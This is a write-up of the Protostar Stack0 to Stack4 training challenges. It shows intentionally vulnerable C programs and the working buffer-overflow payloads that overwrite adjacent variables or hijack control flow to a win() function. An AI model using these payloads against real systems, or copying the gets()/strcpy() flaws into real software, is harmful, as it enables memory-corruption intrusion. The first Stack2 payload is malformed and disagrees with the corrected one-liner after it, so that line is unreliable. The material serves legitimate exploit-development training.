# Protostar: Writeup

Protostar Challange of https://exploit-exercises.lains.space/

## Stack

### Stack0

#### source:

```c
// stack0.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

#### how to solve:

payload:

```python
python -c "print 'A'*65"  | ./stack0
```

### Stack1

#### source:

```c
// stack1.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

#### how to solve

because the hint tells that _protostar_ is little endian, so we have to match the payload:

```bash
./stack1 $(python -c "import struct; print('A'*64 + '\x64\x63\x62\x61' )")
```

### Stack2

#### source:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

#### how to solve:

```shell
# set variable
GREENIE=`python -c "import struct; print('A'*68 + '\x0a\x0d\x0a\0d\0a')"`

# export it to the os env
export GREENIE

# check if it's already loaded
echo $GREENIE

# run the program
./stack2
```

one-liner solution:

```shell
GREENIE=`python -c "import struct; print('A'*64 + '\x0a\x0d\x0a\x0d')"` && export GREENIE && ./stack2
```

### Stack3

#### source:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

#### how to solve:

```shell
# get win function address

(gdb) info addr win
Symbol "win" is a function at address 0x8048424.

# use win() address on the payload
python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3

# output:
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

### Stack4

#### source:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### how to solve

* override main() return method address
* see win() method by using command `objdump -t /opt/protostar/bin/stack4 | grep win`
* craft payload and try to override return value

payload:

```python
#hitstack4.py
import struct

payload = ""

for s in ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'j', 'k', 'l', 'm', 'n']:
        payload += s.lower()*4

for s in ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'j', 'k', 'l', 'm', 'n']:
        payload += s.lower()*4

ebp = 'EEEE'

eip = struct.pack("I", 0x080483f4)

print payload+ebp+eip
```

```bash
# run the payload
python hitstack4.py | /opt/protostar/bin/stack4
```
